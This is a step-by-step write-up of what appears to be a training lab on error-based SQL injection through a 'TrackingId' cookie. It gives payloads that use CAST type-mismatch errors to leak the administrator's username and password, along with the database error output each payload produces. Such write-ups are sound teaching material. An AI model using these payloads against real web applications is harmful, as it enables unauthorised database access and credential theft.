# 🛡️ Visible Error-Based SQL Injection via Cookie Parameter

**Vulnerability Type:** Error-based SQL Injection  
**Vulnerable Parameter:** `TrackingId` (via Cookie)  
**Goal:** Extract the password of the `administrator` user from the database

---

## 🔍 Discovery Phase

To determine if the `TrackingId` cookie is injectable, a single quote `'` was appended:

```sql
TrackingId=jXBKjwhfjPRRASYa'
```

**Result:** The server responded with a SQL syntax error, indicating that the input is being directly injected into a SQL query.

Inferred backend query:

```sql
SELECT trackingId FROM tracking_table WHERE trackingId='jXBKjwhfjPRRASYa''
```

This confirms SQL injection is possible.

---

## ✅ Confirming Injection

A double single quote was used to properly terminate the input:

```sql
TrackingId=jXBKjwhfjPRRASYa''
```

**Response:** `200 OK`  
This verifies that the injection point is functional and that the input is parsed as part of a SQL query.

---

## 🧪 Triggering Error with Type Mismatch

An intentional error was triggered using a `CAST` function:

```sql
TrackingId=jXBKjwhfjPRRASYa' AND CAST((SELECT 1) AS int) --
```

**Error Message:**
```
ERROR: argument of AND must be type boolean, not type integer
```

The query was corrected to resolve the boolean mismatch:

```sql
TrackingId=jXBKjwhfjPRRASYa' AND 1=CAST((SELECT 1) AS int) --
```

**Response:** `200 OK`  
This confirms our injection logic is correct.

---

## 🧬 Extracting Data via Subquery

To extract information from the `users` table:

```sql
TrackingId=jXBKjwhfjPRRASYa' AND 1=CAST((SELECT username FROM users) AS int) --
```

**Error Message:**
```
ERROR: more than one row returned by a subquery used as an expression
```

Modified to limit to a single row:

```sql
TrackingId=jXBKjwhfjPRRASYa' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
```

However, this query was **truncated** due to character limits in the cookie field, breaking the comment section.

---

## ✂️ Fixing Payload Truncation

To shorten the payload, the original `TrackingId` value was removed:

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
```

**Error Message:**
```
ERROR: invalid input syntax for type integer: "administrator"
```

This tells us:
- The query executed.
- The `username` of the first user is `administrator`.

---

## 🎯 Final Goal – Extract Password

To extract the password of the administrator:

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --
```

**Error Message:**
```
ERROR: invalid input syntax for type integer: "a6nlwgub2y2lk65ik6ed"
```

✅ The administrator's password is:
```
a6nlwgub2y2lk65ik6ed
```

---

## ✅ Summary

Using an **error-based SQL injection** vulnerability in the `TrackingId` cookie, we were able to:

- Confirm the vulnerability with syntax testing
- Trigger type mismatch errors to leak data
- Extract the username and password of the administrator

This lab demonstrates the power of observing server behavior through crafted inputs and parsing SQL errors to leak sensitive information.

---
